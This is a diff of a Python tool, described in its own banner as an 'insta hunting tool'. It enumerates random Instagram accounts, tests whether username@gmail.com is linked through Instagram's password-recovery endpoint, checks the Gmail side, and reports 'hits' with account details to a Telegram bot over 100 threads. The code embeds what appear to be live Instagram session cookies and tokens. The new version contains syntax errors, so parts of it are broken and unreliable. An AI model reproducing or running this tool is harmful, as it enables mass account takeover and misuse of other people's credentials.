@@ -1,44 +1,44 @@
-bbk = 1629010000
-Ido = 50000000000
-print("\x1b[1;39m━" * 60)
+print("hello")
 import os
-import cfonts
-from cfonts import render
-import requests
-from bs4 import BeautifulSoup
-import json
-import re
+try:import cfonts;from cfonts import render
+except:os.system("pip install python-cfonts")
+try:import requests
+except:os.system("pip install requests")
+try:from bs4 import BeautifulSoup
+except:os.system("pip install bs4")
+try:import json,re,os,sys
+except:os.system("pip install json")
+try:from datetime import datetime
+except:os.system("pip install re")
+try:from user_agent import generate_user_agent
+except:os.system("pip install user_agent")
+try:from user_agent import generate_user_agent as ggb
+except:os.system("pip install json")
+try:from rich.console import Console
+except:os.system("pip install rich")
+try:from rich.panel import Panel
+except:os.system("pip install threading")
+try:import threading,webbrowser
+except:os.system("pip install random")
+try:import random
+except:os.system("pip install hashlib")
+try:import hashlib
+except:os.system("pip install uuid")
+try:import uuid
+except:os.system("pip install time")
+try:from colorama import Fore, Style
+except:os.system("pip install colorama")
 import sys
-from datetime import datetime
-from user_agent import generate_user_agent
-from user_agent import generate_user_agent as ggb
-from rich.console import Console
-from rich.panel import Panel
-import threading
-import webbrowser
-import random
-import hashlib
-import uuid
-import time
-from colorama import Fore, Style
 import os, sys, subprocess, importlib.util, time
 from requests import post as pp
 from random import choice as cc
 from random import randrange as rr
 import time
-def print_slowly(text, delay=0.1):
-   for char in text:
-       print(char, end='', flush=True)
-       time.sleep(delay)
-   print()
-total = 0
-hits = 0
-badinsta = 0
-bademail = 0
-goodig = 0
-b = random.randint(5,208)
-bo = f'\x1b[38;5;{b}m'
-import time
+from datetime import datetime
+import requests
+from datetime import datetime
+import requests
+from datetime import datetime
 def check_expiry():
     expiry_url = "https://raw.githubusercontent.com/boloradhey/EXPIRY/refs/heads/main/expiry.txt"
     try:
@@ -53,34 +53,31 @@ def check_expiry():
             print(f"{Fore.GREEN}WELCOME TO THE TOOL !! 🦚")
     except requests.exceptions.RequestException as e:
         print(f"⚠Failed to check expiry (using offline fallback): {e}")
-check_expiry()   
-import os,random
-try:from cfonts import render
-except:os.system('pip install python-cfonts');from cfonts import render
-try:from colorama import Fore,Style
-except:os.system('pip install colorama');from colorama import Fore,Style
-def random_color():return random.choice(['magenta','cyan','yellow','red','blue','green'])
-def slow_print(text,delay=.05):
-	for A in text:print(A,end='',flush=True);time.sleep(delay)
-	print()
-def show_banner():A=render('RADHEY',font='block',colors=[random_color()],align='left',space=False);print(A)
-show_banner()
-print_slowly(' \x1b[41m\x1b[1;37m</> ᴛʜɪꜱ ɪɴꜱᴛᴀ ʜᴜɴᴛɪɴɢ ᴛᴏᴏʟ ʙʏ #ʀᴀᴅʜᴇʏ | @ꜱᴜɴʀᴀᴅʜᴇʏ• \x1b[0m\x1b[1;97m ')
-time.sleep(1.5)
-print("\x1b[1;39m━" * 60)
-Token=input("\x1b[1;39mBOT TOKEN :  ")
-print("\x1b[1;39m━" * 60)
-ID=input('\x1b[1;39mCHAT ID : ') 
-print("\x1b[1;39m━" * 60)
+check_expiry()
+
+RADHEY = render('{RADHEY}', colors=['white', 'magenta'], align='center')
+print(RADHEY)
+print(f
+total = 0
+hits = 0
+badinsta = 0
+bademail = 0
+goodig = 0
+b = random.randint(5,208)
+bo = f'\x1b[38;5;{b}m'
+Token=input("BOT TOKEN : ")
+ID=input('CHAT ID : ')
+
+
 def pppp():
     global badinsta,hits,bademail,goodig
     b = random.randint(5,208)
     bo = f'\x1b[38;5;{b}m'
     os.system('cls' if os.name == 'nt' else 'clear')
-    output = f"\rHIT:{hits}\nCHECK:{badinsta}\nMAILS:{bademail}\nGOOD:{goodig}\n@boloradhey\r"
+    output = (f"\rHit : {hits} | Bad : {badinsta} | Mail : {bademail} | Good : {goodig}"\r)
     sys.stdout.write(output)
     sys.stdout.flush()
-yy = 'abcdefghijklmnopqrstuvwxyz'
+yy = 'azertyuiopmlkjhgfdsqwxcvbn'
 def tll():
     try:
         n1 = ''.join(cc(yy) for i in range(rr(6, 9)))
@@ -129,6 +126,7 @@ def tll():
         print(e)
         tll()
 tll()
+
 def rest(user):
   try:
     headers = {
@@ -144,7 +142,7 @@ def rest(user):
     'X-IG-App-ID': '567067343352427',
     'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
     'Accept-Language': 'en-GB, en-US',
-       'Cookie': 'ig_did=2341F722-CAEB-464B-BDA5-CE55E169BB70; datr=9RtWaMfrVDu7pd6yG8SP0BZ1; mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=uc9hAQWFaxTdZI0NSDimPTLolb2l8Jtd; ds_user_id=56358097119; sessionid=56358097119%3AP8OHjq3Fk1PLfS%3A10%3AAYf8XyyatxOtWvyfEnQ-PDCbea4q5zhphe8tJS7CYQ; wd=344x588; rur="NHA\05456358097119\0541782009790:01fe9de4cb3c2a2ff745f4668f9d7805a2f1aabe107ee69be65a0fd776353d65c7e96ddc"',
+       'Cookie': 'ig_did=2341F722-CAEB-464B-BDA5-CE55E169BB70; datr=9RtWaMfrVDu7pd6yG8SP0BZ1; mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=uc9hAQWFaxTdZI0NSDimPTLolb2l8Jtd; ds_user_id=56358097119',
     'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
     'Accept-Encoding': 'gzip, deflate',
     'Host': 'i.instagram.com',
@@ -153,7 +151,7 @@ def rest(user):
     'Content-Length': '356',
 }
     data = {
-    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"uc9hAQWFaxTdZI0NSDimPTLolb2l8Jtd","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
+    'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"6L0wvCsF1PXRYbooUUfXXp1n7AItqDLc","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+user+'"}',
     'ig_sig_key_version': '4',
   }
     response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/',headers=headers,data=data,).json()
@@ -161,6 +159,7 @@ def rest(user):
   except:
     r='no REST !'
   return r
+
 def date(Id):
     try:
         uid = int(Id)
@@ -187,10 +186,13 @@ def date(Id):
         else:
             return "2020-2023"
     except Exception:
-        return 'unknown'
+        return 'hhhh'
+
 def InfoAcc(username, gg):
     global total
+
     rr= infoinsta.get(username,{})
+
     Id = rr.get('pk', None)
     full_name = rr.get('full_name', None)
     fows = rr.get('follower_count', None)
@@ -210,39 +212,41 @@ def InfoAcc(username, gg):
             meta = False
     except:
         meta=False
+
+
     total += 1
     ss = f'''
-#𝐑𝐀𝐃𝐄𝐇𝐘 𝐒𝐄𝐍𝐓 𝐘𝐎𝐔 𝐀 𝐇𝐈𝐓    
-✦ ──── ✦ ──── ✦ ──── ✦ 
-🌀 𝐔𝐬𝐞𝐫𝐧𝐚𝐦𝐞 » @{username}  
-📧 𝐄𝐦𝐚𝐢𝐥 » {username}@gmail.com  
-🔄 𝐑𝐞𝐬𝐞𝐭 𝐂𝐨𝐝𝐞 » {rest(username)}  
-👥 𝐅𝐨𝐥𝐥𝐨𝐰𝐞𝐫𝐬 » {fows}  
-➡️ 𝐅𝐨𝐥𝐥𝐨𝐰𝐢𝐧𝐠 » {fowg}  
-📌 𝐏𝐨𝐬𝐭𝐬 » {pp}  
-📆 𝐘𝐞𝐚𝐫 » {date(Id)}  
-ℹ️ 𝐌𝐞𝐭𝐚 » {meta}  
-🔗 𝐈𝐧𝐬𝐭𝐚𝐠𝐫𝐚𝐦 » instagram.com/{username}  
-✨ 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 » @boloradhey  
-✦ ──── ✦ ──── ✦ ──── ✦  
+🔰 𝗥𝗔𝗗𝗛𝗘𝗬 𝗦𝗘𝗡𝗧 𝗬𝗢𝗨 𝗔 𝗛𝗜𝗧 🔰
+
+𝗡𝗔𝗠𝗘 » {full_name}
+𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 » @{username}
+𝗘𝗠𝗔𝗜𝗟 » {username}@gmail.com
+𝗙𝗢𝗟𝗟𝗢𝗪𝗘𝗥𝗦 » {fows}
+𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 » {fowg}
+𝗣𝗢𝗦𝗧𝗦 » {pp}
+𝗜𝗗 » {Id}
+𝗬𝗘𝗔𝗥 » {date(Id)}
+𝗕𝗜𝗢 » {bio}
+𝗠𝗘𝗧𝗔 » {meta}
+𝗕𝗨𝗦𝗜𝗡𝗘𝗦𝗦 » {bizz}
+🔗 https://www.instagram.com/{username}
+#𝗥𝗔𝗗𝗛𝗘𝗬
 '''
-    with open('radhey.txt','a') as f:f.write(f'{ss}\n')
+    with open('rdh.txt', 'a') as file:file.write(f'{ss}\n')
     try:
         try:
             requests.get(f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={ID}&text={ss}")
-            inline_keyboard=[[{'text':'SS','url':'http://t.me/boloradhey'},{'text':'CHANNEL','url':'https://t.me/+l_0wtXAN-vQ3MTJl'}]]
-            data={'text':ss,'reply_markup':json.dumps({'inline_keyboard':inline_keyboard})}
-            data['chat_id']=ID
-            requests.get(f"https://api.telegram.org/bot{Token}/sendMessage",params=data)
         except Exception as e:
-            print(f"Hii") 
+            print(f"  h ") 
     except:
-        print(f"Hii")
+        print(f"  h ")
+
 def Gmail(email):
     global bademail, hits
     try:
         if '@' in email:
             email = str(email).split('@')[0]
+
         try:
             o = open('tl.txt', 'r').read().splitlines()[0]
         except:
@@ -288,6 +292,8 @@ def Gmail(email):
           bademail+=1
           pppp()
     except:''
+
+
 def format_number(value):
     value = float(value)
     if value >= 1000000:
@@ -295,6 +301,7 @@ def format_number(value):
     elif value >= 1000:
         return f"{value / 1000:.1f}k"
     return str(int(value))
+
 def check_on(email):
     global goodig, badinsta
     ua = generate_user_agent()
@@ -303,12 +310,12 @@ def check_on(email):
     uui = str(uuid.uuid4())
     headers = {
         'User-Agent': ua,
-        'Cookie': 'mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=uc9hAQWFaxTdZI0NSDimPTLolb2l8Jtd',        
+        'Cookie': 'mid=aFYb9gABAAG-r5InxbsJjpNbEge0; csrftoken=6L0wvCsF1PXRYbooUUfXXp1n7AItqDLc',
         'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
     }
     data = {
         'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' + json.dumps({
-            '_csrftoken': 'uc9hAQWFaxTdZI0NSDimPTLolb2l8Jtd',
+            '_csrftoken': '6L0wvCsF1PXRYbooUUfXXp1n7AItqDLc',
             'adid': uui,
             'guid': uui,
             'device_id': device_id,
@@ -317,13 +324,17 @@ def check_on(email):
         'ig_sig_key_version': '4',
     }
     response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data).text
+ 
     if email in response:
         Gmail(email)
+        
+
         goodig += 1
         pppp()
     else:
         badinsta += 1
         pppp()
+
 
 
 infoinsta = {}
@@ -338,12 +349,15 @@ def rand_ids(bbk,Ido):
 def uuu():
  while True:
   try:
+
     domain='@gmail.com'
+    bbk = 1900000000
+    Ido = 21254029834
     while True:      
       rnd=str(random.randint(150, 999))
       user_agent = "Instagram 311.0.0.32.118 Android (" + ["23/6.0", "24/7.0", "25/7.1.1", "26/8.0", "27/8.1", "28/9.0"][random.randint(0, 5)] + "; " + str(random.randint(100, 1300)) + "dpi; " + str(random.randint(200, 2000)) + "x" + str(random.randint(200, 2000)) + "; " + ["SAMSUNG", "HUAWEI", "LGE/lge", "HTC", "ASUS", "ZTE", "ONEPLUS", "XIAOMI", "OPPO", "VIVO", "SONY", "REALME"][random.randint(0, 11)] + "; SM-T" + rnd + "; SM-T" + rnd + "; qcom; en_US; 545986"+str(random.randint(111,999))+")"
       Id = rand_ids(bbk,Ido)
-      lsd=''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for _ in range(32))
+      lsd=''.join(random.choice('azertyuiopmlkjhgfdsqwxcvbnAZERTYUIOPMLKJHGFDSQWXCVBN1234567890') for _ in range(32))
       headers = {
     'accept': '*/*',
     'accept-language': 'en,en-US;q=0.9',
@@ -364,21 +378,26 @@ def uuu():
     'server_timestamps': 'true',
     'doc_id': '7717269488336001',
 }
+
       response = requests.post('https://www.instagram.com/api/graphql', headers=headers, data=data)
       username = response.json().get('data', {}).get('user', {}).get('username')
       infoinsta[username] = response.json().get('data', {}).get('user', {})
       rr = infoinsta.get(username,{})
       fows = rr.get('follower_count', None)
-      if fows >= 35:
+      if fows >= 30:
 	      email = username + domain
-	      check_on(email)          
-  except Exception as e:''    
+	      check_on(email)
+          
+  except Exception as e:''  
 threads = []
-def printing():    
-    for i in range(110):
+def printing():
+    
+    for i in range(100):
         t = threading.Thread(target=uuu)
         t.start()
         threads.append(t)
+
     for t in threads:
         t.join()
 printing()
+
